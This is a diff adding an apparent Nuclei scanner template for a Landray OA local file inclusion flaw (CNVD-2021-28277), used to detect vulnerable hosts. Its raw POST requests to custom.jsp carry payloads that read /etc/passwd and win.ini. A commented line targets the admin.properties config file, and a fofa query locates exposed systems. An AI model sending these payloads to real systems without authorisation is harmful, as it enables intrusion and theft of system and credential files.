@@ -1,0 +1,54 @@
+id: landray-oa-custom-lfi
+
+info:
+  name: 蓝凌 OA custom.jsp - lfi CNVD-2021-28277
+  author: pikpikcu,daffainfo
+  severity: high
+  description: Landray-OA is susceptible to local file inclusion.
+  reference:
+    - https://mp.weixin.qq.com/s/TkUZXKgfEOVqoHKBr3kNdw
+    - https://github.com/Threekiii/Vulnerability-Wiki/blob/54d84115121342e83d13a426c9e1987ee368c8ea/docs-base/docs/oa/%E8%93%9D%E5%87%8COA-admin.do-JNDI%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.md
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
+    cvss-score: 8.6
+    cwe-id: CWE-22
+    cpe: cpe:2.3:a:landray:landray_office_automation:*:*:*:*:*:*:*:*
+  metadata:
+    max-request: 2
+    fofa-query: app="Landray OA system"
+    product: landray_office_automation
+    vendor: landray
+  tags: cnvd,cnvd2021,landray,lfi,oa,2021
+
+http:
+  - raw:
+      - |
+        POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Content-Type: application/x-www-form-urlencoded
+
+        var={"body":{"file":"file:///etc/passwd"}}
+     
+      - |
+        POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Content-Type: application/x-www-form-urlencoded
+
+        var={"body":{"file":"file:///c://windows/win.ini"}}
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+          - "for 16-bit app support"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+
+# var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}
